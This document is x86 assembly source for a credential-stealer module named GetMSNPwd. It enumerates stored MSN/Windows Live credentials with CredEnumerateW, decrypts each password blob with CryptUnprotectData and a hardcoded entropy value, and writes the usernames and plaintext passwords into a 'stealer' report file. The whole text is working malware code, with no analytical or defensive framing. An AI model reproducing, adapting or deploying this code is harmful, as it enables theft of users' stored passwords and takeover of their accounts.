CREDENTIAL_ATTRIBUTEA struc
    Keyword dd ?
    Flags dd ?
    ValueSize  dd ?
    Value dd ?
CREDENTIAL_ATTRIBUTEA ends

CREDENTIALA struc
    Flags dd ?
    _Type dd ?
    TargetName dd ?
    _Comment dd ?
    LastWritten FILETIME <>
    CredentialBlobSize dd ?
    CredentialBlob dd ?
    Persist dd ?
    AttributeCount dd ?
    pAttributes dd ?
    TargetAlias dd ?
    UserName dd ?
CREDENTIALA ends

.data?
     blobCrypt           DATA_BLOB <>
     blobPlainText       DATA_BLOB <>
     blobEntropy         DATA_BLOB <>
     
     msn_buf2            db    100h dup (?)
     msn_buf3            db    100h dup (?)
     
.code

GetMSNPwd proc
      LOCAL   WTF:DWORD
      LOCAL   count      :DWORD
      LOCAL   credb      :DWORD
     
     mov     dword ptr [DataSize], 0
     mov     dword ptr [stbuf], MSN_STEAL
     WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
     
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetMSNPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
     
     lea     eax, credb
     push    eax
     lea     eax, count
     push    eax
     push    0
     push    offset msn_mask
     call    dword ptr [_CredEnumerateW]
     cmp     dword ptr [count], 0
     je      no_cred
     
     mov     eax, offset entropyData
     mov     blobEntropy.pData, eax
     mov     blobEntropy.cbSize, 74
     
     xor     esi, esi
     mov     ecx, dword ptr [count]
cred_enum_lp:
     push    ecx
     push    esi
     mov     eax, dword ptr [credb]
     mov     ebx, dword ptr [eax+esi*4]
     
     assume  ebx: ptr CREDENTIALA
     
     mov     eax, [ebx].CredentialBlob
     mov     blobCrypt.pData, eax
     mov     eax, [ebx].CredentialBlobSize
     mov     blobCrypt.cbSize, eax
     
     push    offset blobPlainText
     push    CRYPTPROTECT_UI_FORBIDDEN
     push    0
     push    0
     push    offset blobEntropy
     push    0
     push    offset blobCrypt
     call    dword ptr [_CryptUnprotectData]
     test    eax, eax
     je      msn_decrypt_fail
     
     lstrcpyW, addr msn_buf3, blobPlainText.pData
     
     mov     eax, [ebx].UserName
     lstrcpyW, addr msn_buf2, eax
     lstrlenW, addr msn_buf2
     imul    eax, eax, 2
     mov     dword ptr [plen], eax
     add     dword ptr [DataSize], sizeof plen
     add     dword ptr [DataSize], eax
     WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
     mov     byte ptr [data_type], REPORT_DATA_LOGIN
     add     dword ptr [DataSize], sizeof data_type
     WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
     WriteFile, stfile, addr msn_buf2, plen, addr SNW, NULL
     lstrlenW, addr msn_buf3
     imul    eax, eax, 2
     mov     dword ptr [plen], eax
     add     dword ptr [DataSize], sizeof plen
     add     dword ptr [DataSize], eax
     WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
     mov     byte ptr [data_type], REPORT_DATA_PWD
     add     dword ptr [DataSize], sizeof data_type
     WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
     WriteFile, stfile, addr msn_buf3, plen, addr SNW, NULL
     
     assume  ebx: ptr nothing
     
   msn_decrypt_fail:
     pop     esi
     pop     ecx
     inc     esi
     dec     ecx
     jnz     cred_enum_lp
     
     push    dword ptr [credb]
     call    dword ptr [_CredFree]
no_cred:

    GetMSNPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4

     WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
     mov     eax, dword ptr [DataSize] ; return actual size of written data
     ret
GetMSNPwd   endp
